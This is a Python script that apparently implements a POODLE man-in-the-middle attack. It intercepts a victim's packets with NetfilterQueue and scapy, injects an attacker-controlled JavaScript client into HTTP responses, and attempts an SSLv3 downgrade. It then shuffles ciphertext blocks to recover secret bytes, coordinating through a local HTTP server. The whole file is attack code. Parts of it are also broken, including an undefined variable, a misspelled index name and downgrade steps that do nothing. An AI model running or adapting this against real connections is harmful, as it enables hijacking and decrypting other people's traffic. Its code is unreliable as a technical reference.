#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy_http.http import *
import threading
import json
from enum import Enum
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
import zlib
import time

SSL_V3_CODE = 768

Stage = Enum('Stage', 'downgrade_dance block_length exploit stop')
stage = Stage.block_length

block_size = None

# Track sessions using src_port as key
sessions = {}
class Session:
	def __init__(self, src_port):
		self.downgrade_needed = True
		self.src_port = src_port
		self.skip_options = True
		self.ciphertext = None
		
# Need to get the server IP from DNS response
server_ip = None
server_ip = '108.188.248.81' # temp

# for block_length stage
ciphertext_length = 0
data_padding_size_needed = 0

# For exploit stage
block_to_move = 1
current_offset = 0
secret = {}

load_layer('tls')

config = json.load(open('config.json'))

js_client_html = open('poodle.js', 'r').read()
js_client_html = js_client_html.replace('attackerIp', '"' + config['attacker'] + '"').replace('targetUrl', '"https://' + config['server'] + '"')

def get_field(layer, field_name):
	return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))

def copy_block_to_end(arr, copy_index):
	arr_list = list(arr)
	last_index = len(arr_list) - block_size
	arr_list[last_index:(last_index+block_size)] = arr[copy_index:(copy_index+block_size)]
	return bytes(arr_list)

def callback(packet):
	global block_size
	global block_to_move
	global ciphertext_length
	global stage
	global data_padding_size_needed

	pkt = IP(packet.get_payload())

	#print(pkt.src + " -> " + pkt.dst)
	#print(pkt[0].summary())

	if 'HTTP' in pkt:

		# On outgoing HTTP requests, make sure there is no compression or caching
		if pkt.src == config['target']:
			raw_http = str(pkt['HTTP']['Raw'].load)
			encoding_pattern = 'Accept-Encoding: ([a-z-]+)'
			cache_pattern = 'Cache-Control: ([a-z-]+)'
			# modify http to ensure headers

			pkt['HTTP']['Raw'].load = raw_http
			packet.set_payload(bytes(pkt))

			#pkt.getlayer(HTTP).getlayer(Raw).load = bytes(str(pkt.getlayer(HTTP).getlayer(Raw).load).replace('Accept-Encoding: gzip', 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache'))
	#		pkt.getlayer(HTTP).show()

			#str_headers = str(pkt['HTTP']['HTTP Request'].fields['Headers'])
			#pkt['HTTP']['HTTP Request'].fields['Accept-Encoding'] = 'identity'
			#pkt['HTTP']['HTTP Request'].fields['Cache-Control'] = 'no-cache'
			#str_headers = str_headers.replace('Accept-Encoding: ' + str(pkt['HTTP']['HTTP Request'].fields['Accept-Encoding']), 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache')
			#pkt['HTTP']['HTTP Request'].fields['Headers'] = str_headers

		# On return packets, inject the JS client
		if pkt.dst == config['target'] and pkt.haslayer(HTTP):
			print(pkt['HTTP']['Raw'].load)
			pkt['HTTP']['Raw'].load += js_client_html
			packet.set_payload(bytes(pkt))

	#if pkt.src == config['target'] and pkt.haslayer(TLS):
	#	print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))

	if pkt.src == config['target'] and pkt.dst == server_ip and 'TLS' in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
		src_port = pkt['TCP'].srcport
		if not src_port in sessions:
			sessions[src_port] = Session(src_port)

		# Don't modify pre-flight check
		if sessions[src_port].skip_options:
			sessions[src_port].skip_options = False
			packet.accept()
			return

		# The JS client is sending packets of increasing length
		if block_length is None:
			if ciphertext_length > 0:
				data_padding_size_needed += 1
				print(len(pkt))
				if len(pkt) > ciphertext_length:
					block_size = len(pkt) - ciphertext_length
					print("Found block size: " + str(block_size))
			else:
				ciphertext_length = len(pkt)

		# The JS client is sending the same packet repeatedly and waiting for us to decrypt it
		else:
			print("Switching block to end")
			data = pkt['TLS']['TLS Application Data'].fields['data']
			if ('TLS' in pkt['TLS'].payload):
				data = pkt['TLS'].payload['TLS']['TLS Application Data'].fields['data']
			sessions[src_port].ciphertext = data

			print(data.hex())
			start_index = block_size * block_to_move
			
			bytes_list = list(bytes(pkt))
			tls_data_start_index = ([i + 5 for i in range(len(bytes_list)) if bytes_list[i:i+3] == [0x17, 0x03, 0x00]])[-1]
			new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
			packet.set_payload(new_bytes)
			print(new_bytes[tls_data_start_index:].hex())

	elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt:

		# TLS Downgrade
		if get_field(pkt.getlayer(TLS), 'type') == "application_data" and get_field(pkt['TLS'], 'version') != 'SSLv3' and pkt.src == server_ip:
			print("Downgrading server packet")
			# Change handshake status to failed
			packet.set_payload(bytes(pkt))

		# If we get success (data instead of alert), do math to get byte
		elif get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dstport in sessions:
			ciphertext = sessions[pkt['TCP'].dstport].ciphertext
			decrypted_byte = (block_size - 1) ^ ciphertext[-block_size - 1] ^ ciphertext[((block_to_move + 1) * block_size) - 1]
			decrypte_byte_index = (block_to_move * block_size) + current_offset
			print("Decrypt byte at {}: {}".format(decrypt_byte_index, decrypted_byte))
			secret[decrypted_byte_index] = decrypted_byte

	elif pkt.dst == config['target'] and 'DNS' in pkt:
		pass
		# parse DNS response and get server_ip

	packet.accept()

class Handler(BaseHTTPRequestHandler):
	def add_headers(self):
		self.send_header("Content-type", "text/plain")
		self.send_header('Access-Control-Allow-Origin', '*')

	def do_GET(self):
		global block_size
		global data_padding_size_needed
		content = None

		while block_size == None:
			time.sleep(0.1)	

		if self.path == '/blocksize':
			content = bytes(str(block_size) + " " + str(int(data_padding_size_needed)), 'utf8')
		elif self.path == '/offset':
			for i in range(block_size):
				if (block_to_move * block_size) + i not in secret:
					current_offset = i
					content = bytes(str(i), 'utf8')
					break
			if content == None:
				self.send_error(404, "Could not find offset")
				return

		else:
			self.send_error(404, "Endpoint does not exist")
			return

		self.send_response(200)
		self.send_header('Content-Length', len(content))
		self.add_headers()
		self.end_headers()
		self.wfile.write(content)

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
	pass

web_server = ThreadingSimpleServer(('0.0.0.0', 8080), Handler)
web_server_thread = threading.Thread(target=web_server.serve_forever)

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback)

try:
	web_server_thread.start()
	nfqueue.run()
except KeyboardInterrupt:
	pass

nfqueue.unbind()
web_server.shutdown()
#web_server.socket.close()
web_server_thread.join()
